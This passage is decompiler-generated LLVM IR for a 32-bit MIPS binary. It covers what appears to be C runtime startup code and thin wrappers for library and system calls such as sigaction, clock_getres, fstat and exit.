  %v2_406f68 = load i32, i32* %v1_406f68, align 4
  store i32 %v2_406f68, i32* %v0.global-to-local, align 4
  %v1_406f70 = icmp eq i32 %v2_406f68, 0
  %v3_406f70 = add i32 %v0_406f64, 4
  store i32 %v3_406f70, i32* %a1.global-to-local, align 4
  br i1 %v1_406f70, label %dec_label_pc_406f74, label %dec_label_pc_406f64

dec_label_pc_406f74:                              ; preds = %dec_label_pc_406f64
  store i32 %v3_406f70, i32* @s0, align 4
  br label %dec_label_pc_406f80

dec_label_pc_406f80:                              ; preds = %dec_label_pc_406fa4, %dec_label_pc_406f74
  %v0_406f94 = phi i32 [ %v1_406fa4, %dec_label_pc_406fa4 ], [ %v3_406f70, %dec_label_pc_406f74 ]
  %v0_406f80 = phi i32 [ %v4_406fb0, %dec_label_pc_406fa4 ], [ 0, %dec_label_pc_406f74 ]
  %v1_406f80 = icmp eq i32 %v0_406f80, 0
  store i32 %v2_406f44, i32* %v0.global-to-local, align 4
  br i1 %v1_406f80, label %dec_label_pc_406fa4, label %dec_label_pc_406f84

dec_label_pc_406f84:                              ; preds = %dec_label_pc_406f80
  %v0_406f8c = load i32, i32* @a0, align 4
  %v1_406f8c = mul i32 %v0_406f8c, 8
  %v2_406f90 = add i32 %v1_406f8c, %v2_406f44
  store i32 %v2_406f90, i32* @a0, align 4
  store i32 %v0_406f94, i32* @a1, align 4
  store i32 8, i32* @a2, align 4
  %v1_406f98 = call i32 @function_407df0()
  store i32 %v1_406f98, i32* %v0.global-to-local, align 4
  store i32 %v2_406ed0, i32* %gp.global-to-local, align 4
  %v0_406fa4.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_406fa4

dec_label_pc_406fa4:                              ; preds = %dec_label_pc_406f80, %dec_label_pc_406f84
  %v0_406fa4 = phi i32 [ %v0_406f94, %dec_label_pc_406f80 ], [ %v0_406fa4.pre, %dec_label_pc_406f84 ]
  %v1_406fa4 = add i32 %v0_406fa4, 8
  store i32 %v1_406fa4, i32* @s0, align 4
  %v1_406fa8 = inttoptr i32 %v1_406fa4 to i32*
  %v2_406fa8 = load i32, i32* %v1_406fa8, align 4
  store i32 %v2_406fa8, i32* @a0, align 4
  %v1_406fb0 = icmp eq i32 %v2_406fa8, 0
  %v3_406fb0 = icmp ult i32 %v2_406fa8, 15
  %v4_406fb0 = zext i1 %v3_406fb0 to i32
  store i32 %v4_406fb0, i32* %v0.global-to-local, align 4
  br i1 %v1_406fb0, label %dec_label_pc_406fb4, label %dec_label_pc_406f80

dec_label_pc_406fb4:                              ; preds = %dec_label_pc_406fa4
  %v3_406fb8 = load i32, i32* @global_var_449aa4.242, align 4
  store i32 %v3_406fb8, i32* @t9, align 4
  %v5_406fc0 = call i32 @function_4080e0(i32 %v2_406f44)
  store i32 %v5_406fc0, i32* %v0.global-to-local, align 4
  store i32 %v2_406ed0, i32* %gp.global-to-local, align 4
  %v3_406fd0 = load i32, i32* @global_var_4499fc.243, align 4
  store i32 %v3_406fd0, i32* @t9, align 4
  %v1_406fd8 = call i32 @function_406e3c()
  store i32 %v1_406fd8, i32* %v0.global-to-local, align 4
  store i32 %tmp27, i32* %v1.global-to-local, align 4
  store i32 %v2_406ed0, i32* %gp.global-to-local, align 4
  %v1_406fe8 = icmp eq i32 %tmp27, 0
  br i1 %v1_406fe8, label %dec_label_pc_406fec, label %dec_label_pc_406ff4

dec_label_pc_406fec:                              ; preds = %dec_label_pc_406fb4
  store i32 4096, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_406ff4

dec_label_pc_406ff4:                              ; preds = %dec_label_pc_406fb4, %dec_label_pc_406fec
  %v0_406ffc = phi i32 [ %tmp27, %dec_label_pc_406fb4 ], [ 4096, %dec_label_pc_406fec ]
  %v3_406ff4 = load i32, i32* @global_var_449ad0, align 4
  store i32 -1, i32* %s1.global-to-local, align 4
  %v2_406ffc = inttoptr i32 %v3_406ff4 to i32*
  store i32 %v0_406ffc, i32* %v2_406ffc, align 4
  store i32 %tmp26, i32* %v0.global-to-local, align 4
  %v1_407008 = load i32, i32* %s1.global-to-local, align 4
  %v2_407008 = icmp eq i32 %tmp26, %v1_407008
  br i1 %v2_407008, label %dec_label_pc_40700c, label %dec_label_pc_407078

dec_label_pc_40700c:                              ; preds = %dec_label_pc_406ff4
  %v3_407010 = load i32, i32* @global_var_449a94.244, align 4
  store i32 %v3_407010, i32* @t9, align 4
  %v1_407018 = call i32 @function_4078b0()
  store i32 %v1_407018, i32* %v0.global-to-local, align 4
  store i32 %v2_406ed0, i32* %gp.global-to-local, align 4
  %v3_407028 = load i32, i32* @global_var_449ab0.245, align 4
  store i32 %v3_407028, i32* @t9, align 4
  store i32 %v1_407018, i32* @s0, align 4
  %v2_407030 = call i32 @function_4077c0()
  store i32 %v2_407030, i32* %v0.global-to-local, align 4
  store i32 %v2_406ed0, i32* %gp.global-to-local, align 4
  %v0_40703c = load i32, i32* @s0, align 4
  %v2_40703c = icmp eq i32 %v0_40703c, %v2_407030
  br i1 %v2_40703c, label %dec_label_pc_407040, label %dec_label_pc_4070ac

dec_label_pc_407040:                              ; preds = %dec_label_pc_40700c
  %v3_407044 = load i32, i32* @global_var_449bc8.246, align 4
  store i32 %v3_407044, i32* @t9, align 4
  %v1_40704c = call i32 @function_407820()
  store i32 %v1_40704c, i32* %v0.global-to-local, align 4
  store i32 %v2_406ed0, i32* %gp.global-to-local, align 4
  %v3_40705c = load i32, i32* @global_var_449b44.247, align 4
  store i32 %v3_40705c, i32* @t9, align 4
  store i32 %v1_40704c, i32* @s0, align 4
  %v2_407064 = call i32 @function_407760()
  store i32 %v2_407064, i32* %v0.global-to-local, align 4
  store i32 %v2_406ed0, i32* %gp.global-to-local, align 4
  %v0_407070 = load i32, i32* @s0, align 4
  %v2_407070 = icmp eq i32 %v0_407070, %v2_407064
  br i1 %v2_407070, label %dec_label_pc_407040.dec_label_pc_407078_crit_edge, label %dec_label_pc_4070ac

dec_label_pc_407040.dec_label_pc_407078_crit_edge: ; preds = %dec_label_pc_407040
  %v1_407080.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_407078

dec_label_pc_407078:                              ; preds = %dec_label_pc_407040.dec_label_pc_407078_crit_edge, %dec_label_pc_406ff4
  %v1_407080 = phi i32 [ %v1_407080.pre, %dec_label_pc_407040.dec_label_pc_407078_crit_edge ], [ %v1_407008, %dec_label_pc_406ff4 ]
  store i32 %tmp26, i32* %v1.global-to-local, align 4
  %v2_407080 = icmp eq i32 %tmp26, %v1_407080
  br i1 %v2_407080, label %dec_label_pc_4070f0, label %dec_label_pc_407084

dec_label_pc_407084:                              ; preds = %dec_label_pc_407078
  store i32 %tmp25, i32* %v0.global-to-local, align 4
  %v2_407090 = icmp eq i32 %tmp26, %tmp25
  br i1 %v2_407090, label %dec_label_pc_407094, label %dec_label_pc_4070ac

dec_label_pc_407094:                              ; preds = %dec_label_pc_407084
  store i32 %tmp24, i32* %v1.global-to-local, align 4
  store i32 %tmp23, i32* %v0.global-to-local, align 4
  %v2_4070a4 = icmp eq i32 %tmp24, %tmp23
  br i1 %v2_4070a4, label %dec_label_pc_4070f0, label %dec_label_pc_4070ac

dec_label_pc_4070ac:                              ; preds = %dec_label_pc_407094, %dec_label_pc_407084, %dec_label_pc_407040, %dec_label_pc_40700c
  %v0_4070ac = load i32, i32* %gp.global-to-local, align 4
  %v1_4070ac = add i32 %v0_4070ac, -32736
  %v2_4070ac = inttoptr i32 %v1_4070ac to i32*
  %v3_4070ac = load i32, i32* %v2_4070ac, align 4
  store i32 %v3_4070ac, i32* %v0.global-to-local, align 4
  %v1_4070b4 = add i32 %v3_4070ac, 28084
  store i32 %v1_4070b4, i32* %s1.global-to-local, align 4
  store i32 131072, i32* %a1.global-to-local, align 4
  store i32 131072, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_4070b4)
  store i32 131074, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_4070b4)
  store i32 131074, i32* %a1.global-to-local, align 4
  %v0_4070dc = load i32, i32* %s1.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_4070dc)
  store i32 %v2_406ed0, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4070f0

dec_label_pc_4070f0:                              ; preds = %dec_label_pc_407094, %dec_label_pc_407078, %dec_label_pc_4070ac
  %v0_4070f0 = load i32, i32* %gp.global-to-local, align 4
  %v1_4070f0 = add i32 %v0_4070f0, -32704
  %v2_4070f0 = inttoptr i32 %v1_4070f0 to i32*
  %v3_4070f0 = load i32, i32* %v2_4070f0, align 4
  store i32 %v3_4070f0, i32* %v1.global-to-local, align 4
  %v3_4070f4 = load i32, i32* %v2_4070f0, align 4
  store i32 %v3_4070f4, i32* %v0.global-to-local, align 4
  %v0_4070f8 = load i32, i32* %s2.global-to-local, align 4
  %v1_4070f8 = inttoptr i32 %v0_4070f8 to i32*
  %v2_4070f8 = load i32, i32* %v1_4070f8, align 4
  %v2_4070fc = sub i32 %v3_4070f4, %v3_4070f0
  store i32 %v2_4070fc, i32* %v0.global-to-local, align 4
  %v1_407100 = sdiv i32 %v2_4070fc, 4
  store i32 %v1_407100, i32* %s1.global-to-local, align 4
  %v1_407104 = add i32 %v0_4070f0, -32688
  %v2_407104 = inttoptr i32 %v1_407104 to i32*
  %v3_407104 = load i32, i32* %v2_407104, align 4
  store i32 %v3_407104, i32* %v0.global-to-local, align 4
  store i32 %arg5, i32* %v1.global-to-local, align 4
  %v2_40710c = inttoptr i32 %v3_407104 to i32*
  store i32 %v2_4070f8, i32* %v2_40710c, align 4
  %v0_407110 = load i32, i32* %gp.global-to-local, align 4
  %v1_407110 = add i32 %v0_407110, -32700
  %v2_407110 = inttoptr i32 %v1_407110 to i32*
  %v3_407110 = load i32, i32* %v2_407110, align 4
  store i32 %v3_407110, i32* %v0.global-to-local, align 4
  store i32 0, i32* %s0.global-to-local, align 4
  %v0_40711c = load i32, i32* %v1.global-to-local, align 4
  %v2_40711c = inttoptr i32 %v3_407110 to i32*
  store i32 %v0_40711c, i32* %v2_40711c, align 4
  %v0_407120.pre = load i32, i32* %gp.global-to-local, align 4
  %v0_407128.pre = load i32, i32* %v0.global-to-local, align 4
  %v1_407134.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_407120

dec_label_pc_407120:                              ; preds = %dec_label_pc_407120, %dec_label_pc_4070f0
  %v1_407134 = phi i32 [ %v2_407134, %dec_label_pc_407120 ], [ %v1_407134.pre, %dec_label_pc_4070f0 ]
  %v0_407128 = phi i32 [ %v3_407144, %dec_label_pc_407120 ], [ %v0_407128.pre, %dec_label_pc_4070f0 ]
  %v0_407120 = phi i32 [ %v2_406ed0, %dec_label_pc_407120 ], [ %v0_407120.pre, %dec_label_pc_4070f0 ]
  %v1_407120 = add i32 %v0_407120, -32704
  %v2_407120 = inttoptr i32 %v1_407120 to i32*
  %v3_407120 = load i32, i32* %v2_407120, align 4
  store i32 %v3_407120, i32* %v1.global-to-local, align 4
  %v2_407128 = add i32 %v3_407120, %v0_407128
  store i32 %v2_407128, i32* %v0.global-to-local, align 4
  %v1_40712c = inttoptr i32 %v2_407128 to i32*
  %v2_40712c = load i32, i32* %v1_40712c, align 4
  %v2_407134 = add i32 %v1_407134, 1
  store i32 %v2_407134, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_40712c)
  store i32 %v2_406ed0, i32* %gp.global-to-local, align 4
  %v1_407140 = load i32, i32* %s1.global-to-local, align 4
  %v2_407140 = icmp ult i32 %v2_407134, %v1_407140
  %v3_407144 = mul i32 %v2_407134, 4
  store i32 %v3_407144, i32* %v0.global-to-local, align 4
  br i1 %v2_407140, label %dec_label_pc_407120, label %dec_label_pc_407148

dec_label_pc_407148:                              ; preds = %dec_label_pc_407120
  %v0_40714c = load i32, i32* %s3.global-to-local, align 4
  %v1_40714c = icmp eq i32 %v0_40714c, 0
  br i1 %v1_40714c, label %dec_label_pc_407164, label %dec_label_pc_407150

dec_label_pc_407150:                              ; preds = %dec_label_pc_407148
  call void @__pseudo_call(i32 %v0_40714c)
  store i32 %v2_406ed0, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_407164

dec_label_pc_407164:                              ; preds = %dec_label_pc_407148, %dec_label_pc_407150
  %v3_407164 = load i32, i32* @global_var_4499f0, align 4
  store i32 %v3_407164, i32* %v1.global-to-local, align 4
  store i32 0, i32* %s0.global-to-local, align 4
  store i32 0, i32* %v0.global-to-local, align 4
  store i32 0, i32* %s1.global-to-local, align 4
  %v1_40717c = add i32 %v1_406ed0, 273192
  %v2_40717c = inttoptr i32 %v1_40717c to i32*
  br label %dec_label_pc_40717c

dec_label_pc_40717c:                              ; preds = %dec_label_pc_40717c, %dec_label_pc_407164
  %v1_407190 = phi i32 [ %v2_407190, %dec_label_pc_40717c ], [ 0, %dec_label_pc_407164 ]
  %v0_407184 = phi i32 [ %v3_4071a0, %dec_label_pc_40717c ], [ 0, %dec_label_pc_407164 ]
  %v3_40717c = load i32, i32* %v2_40717c, align 4
  store i32 %v3_40717c, i32* %v1.global-to-local, align 4
  %v2_407184 = add i32 %v3_40717c, %v0_407184
  store i32 %v2_407184, i32* %v0.global-to-local, align 4
  %v1_407188 = inttoptr i32 %v2_407184 to i32*
  %v2_407188 = load i32, i32* %v1_407188, align 4
  %v2_407190 = add i32 %v1_407190, 1
  store i32 %v2_407190, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_407188)
  store i32 %v2_406ed0, i32* %gp.global-to-local, align 4
  %v1_40719c = load i32, i32* %s1.global-to-local, align 4
  %v2_40719c = icmp ult i32 %v2_407190, %v1_40719c
  %v3_4071a0 = mul i32 %v2_407190, 4
  store i32 %v3_4071a0, i32* %v0.global-to-local, align 4
  br i1 %v2_40719c, label %dec_label_pc_40717c, label %dec_label_pc_4071a4

dec_label_pc_4071a4:                              ; preds = %dec_label_pc_40717c
  %v3_4071a8 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_4071a8, i32* %v0.global-to-local, align 4
  %v1_4071b0 = icmp eq i32 %v3_4071a8, 0
  br i1 %v1_4071b0, label %dec_label_pc_4071d0, label %dec_label_pc_4071b4

dec_label_pc_4071b4:                              ; preds = %dec_label_pc_4071a4
  store i32 %v3_4071a8, i32* @t9, align 4
  %v1_4071c0 = call i32 @function_4056e0()
  store i32 %v1_4071c0, i32* %v0.global-to-local, align 4
  store i32 %v2_406ed0, i32* %gp.global-to-local, align 4
  %v1_4071cc = inttoptr i32 %v1_4071c0 to i32*
  store i32 0, i32* %v1_4071cc, align 4
  br label %dec_label_pc_4071d0

dec_label_pc_4071d0:                              ; preds = %dec_label_pc_4071a4, %dec_label_pc_4071b4
  %v3_4071d0 = load i32, i32* @global_var_449b04.248, align 4
  store i32 %v3_4071d0, i32* %v0.global-to-local, align 4
  %v1_4071d8 = icmp eq i32 %v3_4071d0, 0
  br i1 %v1_4071d8, label %dec_label_pc_4071f8, label %dec_label_pc_4071dc

dec_label_pc_4071dc:                              ; preds = %dec_label_pc_4071d0
  %v1_4071e8 = call i32 @unknown_0()
  store i32 %v1_4071e8, i32* %v0.global-to-local, align 4
  store i32 %v2_406ed0, i32* %gp.global-to-local, align 4
  %v1_4071f4 = inttoptr i32 %v1_4071e8 to i32*
  store i32 0, i32* %v1_4071f4, align 4
  br label %dec_label_pc_4071f8

dec_label_pc_4071f8:                              ; preds = %dec_label_pc_4071d0, %dec_label_pc_4071dc
  %v0_4071f8 = load i32, i32* %gp.global-to-local, align 4
  %v1_4071f8 = add i32 %v0_4071f8, -32212
  %v2_4071f8 = inttoptr i32 %v1_4071f8 to i32*
  %v3_4071f8 = load i32, i32* %v2_4071f8, align 4
  store i32 %v3_4071f8, i32* @v0, align 4
  %v1_407200 = inttoptr i32 %v3_4071f8 to i32*
  %v2_407200 = load i32, i32* %v1_407200, align 4
  store i32 %v2_407200, i32* %a2.global-to-local, align 4
  %v0_407204 = load i32, i32* %s5.global-to-local, align 4
  store i32 4223504, i32* @ra, align 4
  %v1_407208 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_407208, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_407204)
  store i32 %v2_406ed0, i32* %gp.global-to-local, align 4
  %v3_407218 = load i32, i32* @global_var_449a04.249, align 4
  store i32 %v3_407218, i32* @t9, align 4
  %v1_407220 = load i32, i32* @v0, align 4
  %v3_407220 = call i32 @function_406800(i32 %v1_407220)
  store i32 %v3_407220, i32* %v0.global-to-local, align 4
  ret i32 %v3_407220

; uselistorder directives
  uselistorder i32 %v2_407190, { 2, 0, 3, 1 }
  uselistorder i32 %v2_407134, { 2, 0, 3, 1 }
  uselistorder i32 %v4_406fb0, { 1, 0 }
  uselistorder i32 %v1_406fa4, { 1, 2, 0 }
  uselistorder i32 %v3_406f70, { 0, 1, 3, 2 }
  uselistorder i32 %v0_406f64, { 2, 1, 0 }
  uselistorder i32 %v2_406f44, { 1, 0, 2 }
  uselistorder i32 %v2_406ed0, { 6, 5, 4, 7, 3, 8, 0, 2, 9, 10, 11, 12, 13, 14, 1, 15, 16 }
  uselistorder i32 %tmp27, { 0, 2, 1 }
  uselistorder i32 %tmp26, { 0, 4, 3, 2, 1 }
  uselistorder i32 %tmp25, { 1, 0 }
  uselistorder i32 %tmp24, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 2, 1, 17, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 20, 22, 21, 23, 25, 24, 29, 26, 27, 28, 30, 31 }
  uselistorder i32* %s1.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8 }
  uselistorder i32* %gp.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 15, 12, 13, 7, 14, 8, 9, 10, 11, 16, 17, 18, 19, 20 }
  uselistorder i32* %a2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %a1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 (i32)* @function_406800, { 1, 0 }
  uselistorder i32 4096, { 0, 2, 1 }
  uselistorder i32 15, { 3, 1, 0, 2 }
  uselistorder i32 ()* @function_407df0, { 1, 0 }
  uselistorder i32 120, { 1, 2, 0, 3 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_4071f8, { 1, 0 }
  uselistorder label %dec_label_pc_4071d0, { 1, 0 }
  uselistorder label %dec_label_pc_407164, { 1, 0 }
  uselistorder label %dec_label_pc_4070f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_406ff4, { 1, 0 }
  uselistorder label %dec_label_pc_406fa4, { 1, 0 }
  uselistorder label %dec_label_pc_406f40, { 1, 0 }
}

define i32 @function_407230(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407230:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp8 = alloca i32, align 4
  store i32 %tmp, i32* %s0.global-to-local, align 4
  store i32 %arg3, i32* %s1.global-to-local, align 4
  %v1_40726c = icmp eq i32* %arg2, null
  br i1 %v1_40726c, label %dec_label_pc_40729c, label %dec_label_pc_407270

dec_label_pc_407270:                              ; preds = %dec_label_pc_407230
  %v3_407260 = load i32, i32* @global_var_449b68.192, align 4
  call void @__pseudo_call(i32 %v3_407260)
  %v0_407280 = load i32, i32* %s0.global-to-local, align 4
  %v1_407280 = add i32 %v0_407280, 136
  %v2_407280 = inttoptr i32 %v1_407280 to i32*
  %v3_407280 = load i32, i32* %v2_407280, align 4
  store i32 %v3_407280, i32* @v1, align 4
  %v1_407284 = inttoptr i32 %v0_407280 to i32*
  %v2_407284 = load i32, i32* %v1_407284, align 4
  store i32 %v2_407284, i32* @v0, align 4
  br label %dec_label_pc_40729c

dec_label_pc_40729c:                              ; preds = %dec_label_pc_407230, %dec_label_pc_407270
  %v3_4072ac = load i32, i32* @global_var_449b24.250, align 4
  store i32 16, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_4072ac)
  %v0_4072c0 = load i32, i32* %s1.global-to-local, align 4
  %v1_4072c0 = icmp eq i32 %v0_4072c0, 0
  %v2_4072c0 = load i32, i32* @v0, align 4
  store i32 %v2_4072c0, i32* %s0.global-to-local, align 4
  br i1 %v1_4072c0, label %dec_label_pc_4072fc, label %dec_label_pc_4072c4

dec_label_pc_4072c4:                              ; preds = %dec_label_pc_40729c
  %v1_4072d4 = icmp slt i32 %v2_4072c0, 0
  br i1 %v1_4072d4, label %dec_label_pc_4072fc, label %dec_label_pc_4072d8

dec_label_pc_4072d8:                              ; preds = %dec_label_pc_4072c4
  %v3_4072c8 = load i32, i32* @global_var_449b68.192, align 4
  call void @__pseudo_call(i32 %v3_4072c8)
  %v3_4072ec = load i32, i32* %tmp8, align 4
  %v1_4072f4 = load i32, i32* %s1.global-to-local, align 4
  %v2_4072f4 = inttoptr i32 %v1_4072f4 to i32*
  store i32 %v3_4072ec, i32* %v2_4072f4, align 4
  %v0_4072f8 = load i32, i32* @v1, align 4
  %v1_4072f8 = load i32, i32* %s1.global-to-local, align 4
  %v2_4072f8 = add i32 %v1_4072f8, 136
  %v3_4072f8 = inttoptr i32 %v2_4072f8 to i32*
  store i32 %v0_4072f8, i32* %v3_4072f8, align 4
  %v0_4072fc.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4072fc

dec_label_pc_4072fc:                              ; preds = %dec_label_pc_4072c4, %dec_label_pc_40729c, %dec_label_pc_4072d8
  %v0_4072fc = phi i32 [ %v2_4072c0, %dec_label_pc_4072c4 ], [ %v2_4072c0, %dec_label_pc_40729c ], [ %v0_4072fc.pre, %dec_label_pc_4072d8 ]
  ret i32 %v0_4072fc

; uselistorder directives
  uselistorder i32* @v1, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder label %dec_label_pc_4072fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_40729c, { 1, 0 }
}

define i32 @function_407320(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407320:
  %s0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %sigaction*
  %v7_407340 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp)
  %v3_407344 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_407344, i32* @t9, align 4
  %v1_407348 = icmp eq i32 %arg4, 0
  store i32 %v7_407340, i32* %s0.global-to-local, align 4
  br i1 %v1_407348, label %dec_label_pc_407364, label %dec_label_pc_40734c

dec_label_pc_40734c:                              ; preds = %dec_label_pc_407320
  %v1_407350 = call i32 @function_4056e0()
  %v0_40735c = load i32, i32* %s0.global-to-local, align 4
  %v2_40735c = inttoptr i32 %v1_407350 to i32*
  store i32 %v0_40735c, i32* %v2_40735c, align 4
  br label %dec_label_pc_407364

dec_label_pc_407364:                              ; preds = %dec_label_pc_407320, %dec_label_pc_40734c
  %v4_40736c = phi i32 [ %v7_407340, %dec_label_pc_407320 ], [ -1, %dec_label_pc_40734c ]
  ret i32 %v4_40736c

; uselistorder directives
  uselistorder label %dec_label_pc_407364, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_407380(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_407380:
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_4073d0(i32 %arg1, %timespec* %arg2) local_unnamed_addr {
dec_label_pc_4073d0:
  %s0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  store i32 4264, i32* %v0.global-to-local, align 4
  %v4_4073f0 = call i32 @sys_clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_4073f0, i32* %v0.global-to-local, align 4
  %v3_4073f4 = load i32, i32* @global_var_449abc.83, align 4
  %v0_4073f8 = load i32, i32* @a3, align 4
  %v1_4073f8 = icmp eq i32 %v0_4073f8, 0
  store i32 %v4_4073f0, i32* %s0.global-to-local, align 4
  br i1 %v1_4073f8, label %dec_label_pc_407414, label %dec_label_pc_4073fc

dec_label_pc_4073fc:                              ; preds = %dec_label_pc_4073d0
  call void @__pseudo_call(i32 %v3_4073f4)
  %v0_40740c = load i32, i32* %s0.global-to-local, align 4
  %v1_40740c = load i32, i32* %v0.global-to-local, align 4
  %v2_40740c = inttoptr i32 %v1_40740c to i32*
  store i32 %v0_40740c, i32* %v2_40740c, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_407414

dec_label_pc_407414:                              ; preds = %dec_label_pc_4073d0, %dec_label_pc_4073fc
  %v4_40741c = phi i32 [ %v4_4073f0, %dec_label_pc_4073d0 ], [ -1, %dec_label_pc_4073fc ]
  ret i32 %v4_40741c

; uselistorder directives
  uselistorder i32* %v0.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_407414, { 1, 0 }
}

define i32 @function_407430(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_407430:
  %v0.global-to-local = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %v0_407444 = load i32, i32* @s1, align 4
  %v0_407448 = load i32, i32* @s0, align 4
  store i32 %arg2, i32* @s1, align 4
  %tmp10 = bitcast i32* %stack_var_-160 to %stat*
  store i32 4108, i32* %v0.global-to-local, align 4
  %v4_407460 = call i32 @fstat(i32 %arg1, %stat* %tmp10)
  store i32 %v4_407460, i32* %v0.global-to-local, align 4
  %v3_407464 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_407464, i32* @t9, align 4
  %v0_407468 = load i32, i32* @a3, align 4
  %v1_407468 = icmp eq i32 %v0_407468, 0
  store i32 %v4_407460, i32* @s0, align 4
  br i1 %v1_407468, label %dec_label_pc_407488, label %dec_label_pc_40746c

dec_label_pc_40746c:                              ; preds = %dec_label_pc_407430
  %v1_407470 = call i32 @function_4056e0()
  store i32 %v1_407470, i32* %v0.global-to-local, align 4
  %v0_40747c = load i32, i32* @s0, align 4
  %v2_40747c = inttoptr i32 %v1_407470 to i32*
  store i32 %v0_40747c, i32* %v2_40747c, align 4
  store i32 -1, i32* @s0, align 4
  %v0_407490.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_407488

dec_label_pc_407488:                              ; preds = %dec_label_pc_407430, %dec_label_pc_40746c
  %v0_407490 = phi i32 [ %v4_407460, %dec_label_pc_407430 ], [ %v0_407490.pre, %dec_label_pc_40746c ]
  %v0_4074a43 = phi i32 [ %v4_407460, %dec_label_pc_407430 ], [ -1, %dec_label_pc_40746c ]
  %v3_407488 = load i32, i32* @global_var_449b20.251, align 4
  store i32 %v3_407488, i32* @t9, align 4
  %v1_407490 = icmp eq i32 %v0_407490, 0
  br i1 %v1_407490, label %dec_label_pc_407494, label %dec_label_pc_4074a4

dec_label_pc_407494:                              ; preds = %dec_label_pc_407488
  %v2_407490 = load i32, i32* @s1, align 4
  %v4_407498 = call i32 @function_407cd0(i32* nonnull %stack_var_-160, i32 %v2_407490)
  store i32 %v4_407498, i32* %v0.global-to-local, align 4
  %v0_4074a4.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_4074a4

dec_label_pc_4074a4:                              ; preds = %dec_label_pc_407488, %dec_label_pc_407494
  %v0_4074a4 = phi i32 [ %v0_4074a43, %dec_label_pc_407488 ], [ %v0_4074a4.pre, %dec_label_pc_407494 ]
  store i32 %v0_4074a4, i32* %v0.global-to-local, align 4
  store i32 %v0_407444, i32* @s1, align 4
  store i32 %v0_407448, i32* @s0, align 4
  ret i32 %v0_4074a4

; uselistorder directives
  uselistorder i32 %v0_4074a4, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 1, 2, 4, 5, 0, 3 }
  uselistorder i32* @s1, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71 }
  uselistorder label %dec_label_pc_4074a4, { 1, 0 }
  uselistorder label %dec_label_pc_407488, { 1, 0 }
}

define i32 @function_4074c0(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4074c0:
  %a2.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @a1, align 4
  %v0_4074d0 = load i32, i32* @ra, align 4
  %v3_4074e4 = load i32, i32* @global_var_449aa0.252, align 4
  store i32 %v3_4074e4, i32* @t9, align 4
  store i32 %tmp, i32* @s0, align 4
  %v2_4074ec = call i32 @function_407590()
  store i32 %v2_4074ec, i32* %v0.global-to-local, align 4
  %v1_4074f8 = icmp slt i32 %v2_4074ec, 1
  store i32 %v2_4074ec, i32* %s1.global-to-local, align 4
  br i1 %v1_4074f8, label %dec_label_pc_40756c, label %dec_label_pc_4074fc

dec_label_pc_4074fc:                              ; preds = %dec_label_pc_4074c0
  %v0_407504 = load i32, i32* @s0, align 4
  %v2_407504 = add i32 %v0_407504, %v2_4074ec
  store i32 %v2_407504, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_407508

dec_label_pc_407508:                              ; preds = %dec_label_pc_407508, %dec_label_pc_4074fc
